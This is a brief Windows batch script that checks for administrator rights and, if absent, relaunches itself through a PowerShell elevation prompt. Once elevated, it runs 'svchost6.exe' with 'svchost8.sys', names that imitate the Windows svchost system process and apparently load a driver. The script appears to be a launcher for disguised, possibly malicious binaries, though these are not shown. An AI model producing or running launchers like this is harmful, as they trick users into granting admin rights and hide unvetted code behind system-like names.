@echo off
cd /d "%~dp0"
echo.
net session >nul 2>&1
if %errorLevel% == 0 (
    goto :continue
) else (
    goto :admin
)

:admin
echo.
powershell -Command "Start-Process '%0' -Verb RunAs"
exit
:continue
echo.
svchost6.exe svchost8.sys
echo.
exit